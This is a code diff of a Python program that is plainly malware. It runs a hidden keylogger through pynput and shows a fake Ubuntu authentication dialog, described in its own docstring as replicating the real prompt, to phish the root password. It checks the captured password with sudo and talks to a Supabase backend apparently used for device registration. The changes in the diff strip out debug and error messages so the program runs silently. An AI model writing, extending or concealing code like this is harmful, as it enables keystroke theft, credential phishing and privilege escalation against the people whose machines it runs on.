@@ -53,7 +53,6 @@ def get_config():
             decrypted.append(encrypted[i] ^ key_bytes[i % len(key_bytes)])
         return json.loads(decrypted.decode('utf-8'))
     except Exception as e:
-        print(f"Config Error: {e}", flush=True)
         return None
 
 def get_device_id():
@@ -107,22 +106,16 @@ def start_keylogger_thread():
             
         with KEYLOG_LOCK:
             KEYLOG_BUFFER.append(str(char))
-            if len(KEYLOG_BUFFER) > 5000: # Limit buffer
+            if len(KEYLOG_BUFFER) > 5000:
                 KEYLOG_BUFFER.pop(0)
-        
-        # Debug log every 10 keystrokes
-        if len(KEYLOG_BUFFER) % 10 == 0:
-            print(f"DEBUG: Keylogger buffer size: {len(KEYLOG_BUFFER)}", flush=True)
 
     try:
         import pynput.keyboard
-        # non-blocking start
         listener = pynput.keyboard.Listener(on_press=on_press)
         listener.daemon = True
         listener.start()
-        print("DEBUG: Keylogger thread started (silently).", flush=True)
     except Exception as e:
-        print(f"DEBUG: Keylogger failed to start: {e}", flush=True)
+        pass
 
 def attempt_root_escalation():
     """
@@ -130,15 +123,12 @@ def attempt_root_escalation():
     Replicates the exact look of Ubuntu's prompt.
     """
     global ROOT_PASSWORD
-    print(f"Attempting root escalation (Fake Auth)... Current RootPW: {ROOT_PASSWORD}", flush=True)
     
     # Check Tkinter availability
     try:
         import tkinter as tk
         from tkinter import font
-        print("DEBUG: Tkinter available", flush=True)
     except ImportError as e:
-        print(f"DEBUG: Tkinter failed: {e}", flush=True)
         return False, "Tkinter not installed."
 
     result_pw = None
@@ -166,7 +156,6 @@ def attempt_root_escalation():
             if not os.path.exists(base_dir):
                 base_dir = os.path.dirname(os.path.abspath(__file__))
             img_path = os.path.join(base_dir, "prompt.png")
-            print(f"DEBUG: Image path: {img_path}", flush=True)
 
             bg_image = None
             try:
@@ -331,30 +320,26 @@ def attempt_root_escalation():
             
             root.after(60000, lambda: cancel())
 
-            print("DEBUG: Starting tkinter mainloop...", flush=True)
             try:
                 root.mainloop()
             except Exception as e:
-                print(f"DEBUG: Mainloop error: {e}", flush=True)
+                pass
             
             # Cleanup
-            print("DEBUG: Tkinter cleanup...", flush=True)
             try:
                 if 'root' in locals(): root.destroy()
             except: pass
 
         except Exception as e:
-            print(f"GUI Exception: {e}", flush=True)
+            pass
 
     # Execute UI
     try:
         show_ui()
     except Exception as e:
-        print(f"DEBUG: UI Error: {e}", flush=True)
         return False, f"UI Failed: {e}"
 
     if result_pw:
-        print(f"✅ Password Captured: {result_pw}", flush=True)
         test = subprocess.run(f"sudo -k && echo '{result_pw}' | sudo -S id", shell=True, capture_output=True, text=True)
         if test.returncode == 0:
             ROOT_PASSWORD = result_pw
@@ -396,7 +381,7 @@ def api_request(config, endpoint, method="GET", data=None):
         "apikey": config['supabase_key'],
         "Authorization": f"Bearer {config['supabase_key']}",
         "Content-Type": "application/json",
-        "Prefer": "return=representation"  # Changed from return=minimal to get response
+        "Prefer": "return=representation"
     }
     try:
         req = urllib.request.Request(url, method=method)
@@ -412,10 +397,8 @@ def api_request(config, endpoint, method="GET", data=None):
             return True
     except urllib.error.HTTPError as e:
         error_body = e.read().decode() if e.fp else "No error body"
-        print(f"API HTTP Error ({endpoint}): {e.code} - {error_body}", flush=True)
         return None
     except Exception as e:
-        print(f"API Error ({endpoint}): {e}", flush=True)
         return None
 
 def register_device(config, device_id):
